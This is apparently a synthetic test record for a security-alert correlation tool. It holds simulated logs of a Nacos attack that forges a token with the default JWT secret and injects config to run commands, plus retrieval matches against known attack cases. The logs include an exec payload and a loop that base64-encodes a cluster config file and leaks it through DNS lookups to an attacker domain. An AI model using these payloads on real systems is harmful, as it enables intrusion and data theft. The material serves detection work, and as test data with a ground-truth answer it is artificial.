@@ -1,0 +1,195 @@
+{
+ "unit": 1027,
+ "gt": {
+  "gt_class": "new",
+  "gt_case": null,
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "不属于已入库的 8 个案例家族"
+ },
+ "technique": "Nacos 默认 JWT 密钥伪造 token 后配置注入触发命令执行",
+ "sources": [
+  "waf",
+  "web",
+  "rasp",
+  "hids",
+  "dns",
+  "dns",
+  "dns"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-06-16 03:47:09",
+   "source": "waf",
+   "log_id": "WAF0304930",
+   "content": "/nacos/v1/cs/configs ?dataId=rce.yaml&group=DEFAULT_GROUP&content=exec:[\"/bin/sh\",\"id\"] Mozilla/5.0 (iPhone; C",
+   "event_id": "1027-WAF0304930"
+  },
+  {
+   "timestamp": "2026-06-16 03:47:10",
+   "source": "web",
+   "log_id": "WEB0306914",
+   "content": "/nacos/v1/cs/configs ?dataId=rce.yaml&group=DEFAULT_GROUP&content=exec:[\"/bin/sh\",\"id\"] Mozilla/5.0 (iPhone; C",
+   "event_id": "1027-WEB0306914"
+  },
+  {
+   "timestamp": "2026-06-16 03:47:12",
+   "source": "rasp",
+   "log_id": "RASP0337370",
+   "content": "https://app-spring-9.ops-corp.com/nacos/v1/cs/configs {\"jwt\": \"nacos_default_secret\"} Mozilla/5.0 (iPhone; CPU",
+   "event_id": "1027-RASP0337370"
+  },
+  {
+   "timestamp": "2026-06-16 03:48:14",
+   "source": "hids",
+   "log_id": "HID0330457",
+   "content": "for l in $(cat /home/nacos/conf/cluster.conf|base64|fold -w30); do nslookup $l.mnwcug-15ef.org; done for for l",
+   "event_id": "1027-HID0330457"
+  },
+  {
+   "timestamp": "2026-06-16 04:42:14",
+   "source": "dns",
+   "log_id": "DNS0314838",
+   "content": "c0e41548.mnwcug-15ef.org A 10.10.33.97",
+   "event_id": "1027-DNS0314838"
+  },
+  {
+   "timestamp": "2026-06-16 04:42:48",
+   "source": "dns",
+   "log_id": "DNS0314840",
+   "content": "fe3f939c.mnwcug-15ef.org A 198.51.100.48",
+   "event_id": "1027-DNS0314840"
+  },
+  {
+   "timestamp": "2026-06-16 04:44:13",
+   "source": "dns",
+   "log_id": "DNS0314848",
+   "content": "885dd9ec.mnwcug-15ef.org A 10.10.39.75",
+   "event_id": "1027-DNS0314848"
+  }
+ ],
+ "retrieval_full": [
+  {
+   "case_id": "CASE-002",
+   "name": "Tomcat PUT 上传 JSP webshell + DNS C2 心跳",
+   "summary": "PUT 方法把 JSP webshell 写入上传目录 → 应用侧记录 webshell 上传与 exec 标记 → Tomcat 进程派生子 shell 执行探针 → 数小时后 DGA 风格域名突发解析。",
+   "matched_steps": 1,
+   "total_steps": 4,
+   "shape": "middle",
+   "longest_run": 1,
+   "tier": "weak",
+   "order_ok": true,
+   "order_assessable": true,
+   "source_fit_ratio": 1.0,
+   "evidence": [
+    {
+     "step_id": "S4",
+     "action_id": "dga_hex_subdomain_beacon",
+     "label": "DGA 风格子域突发解析",
+     "event_ids": [
+      "1027-DNS0314848"
+     ],
+     "sources": [
+      "dns"
+     ],
+     "generic": true
+    }
+   ],
+   "source_mismatches": [],
+   "keyword_score": 0,
+   "keyword_details": [],
+   "mitre": [
+    "T1190",
+    "T1505.003",
+    "T1071.004"
+   ],
+   "unobserved_steps": [
+    "S1",
+    "S2",
+    "S3"
+   ],
+   "before_steps": [
+    "S1",
+    "S2",
+    "S3"
+   ],
+   "gap_steps": [],
+   "predict_next": null,
+   "matched_non_generic_steps": 0
+  },
+  {
+   "case_id": "CASE-001",
+   "name": "Log4Shell JNDI 注入（LDAP 回连 + Base64 命令执行）",
+   "summary": "Web 参数注入 ${jndi:ldap://…} → 应用侧 JNDI 解析并回连攻击者 LDAP → 主机侧 java 进程派生子 shell 执行命令。",
+   "matched_steps": 0,
+   "total_steps": 3,
+   "shape": "none",
+   "longest_run": 0,
+   "tier": "keyword_only",
+   "order_ok": false,
+   "order_assessable": false,
+   "source_fit_ratio": 0.0,
+   "evidence": [],
+   "source_mismatches": [],
+   "keyword_score": 3,
+   "keyword_details": [
+    "keyword +3: base64"
+   ],
+   "mitre": [
+    "T1190",
+    "T1059.004",
+    "T1105"
+   ],
+   "unobserved_steps": [
+    "S1",
+    "S2",
+    "S3"
+   ],
+   "before_steps": [],
+   "gap_steps": [],
+   "predict_next": null,
+   "matched_non_generic_steps": 0
+  }
+ ],
+ "evidence_for_agent": {
+  "tier": "weak",
+  "shape": "middle",
+  "matched_steps": 1,
+  "total_steps": 4,
+  "order_ok": true,
+  "order_assessable": true,
+  "source_fit_ratio": 1.0,
+  "steps": [
+   {
+    "step_id": "S4",
+    "label": "DGA 风格子域突发解析",
+    "sources": [
+     "dns"
+    ],
+    "generic": true,
+    "event_ids": [
+     "1027-DNS0314848"
+    ]
+   }
+  ],
+  "unobserved_steps": [
+   "S1",
+   "S2",
+   "S3"
+  ],
+  "gap_steps": [],
+  "before_steps": [
+   "S1",
+   "S2",
+   "S3"
+  ],
+  "predict_next": null,
+  "source_mismatches": [],
+  "keyword_score": 0,
+  "mitre": [
+   "T1190",
+   "T1505.003",
+   "T1071.004"
+  ]
+ }
+}
